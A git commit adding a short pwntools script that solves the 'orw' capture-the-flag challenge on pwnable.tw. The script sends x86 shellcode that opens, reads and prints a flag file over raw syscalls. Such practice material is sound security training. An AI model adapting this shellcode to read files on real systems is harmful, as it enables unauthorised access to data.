78b5a7bd625b1c753ab145f47fca850b0f4506c2
rhamaa <r4m@protonmail.com>
2018-01-09 09:37:17 +0700

    Pwnabletw - orw

---
+++ Pwnable.tw/orw.py
@@ -0,0 +1,38 @@
+from pwn import *
+
+orw = remote("chall.pwnable.tw",10001)
+
+shellcode = '''xor ecx,ecx
+push ecx
+push 0x67616c66
+push 0x2f2f7772
+push 0x6f2f2f65
+push 0x6d6f682f
+mov ebx,esp
+xor eax,eax
+mov al,5
+int 0x80
+
+xor ebx,ebx
+mov bl, al
+lea ecx,[esp]
+mov dl,40
+int 0x80
+
+xor eax,eax
+mov al,4
+xor ebx,ebx
+inc ebx
+lea ecx,[esp]
+mov dl,40
+int 0x80
+
+xor eax,eax
+inc eax
+xor ebx,ebx
+int 0x80'''
+
+shellcode = asm(shellcode)
+orw.recvuntil("Give my your shellcode:")
+orw.sendline(shellcode)
+print orw.recv()
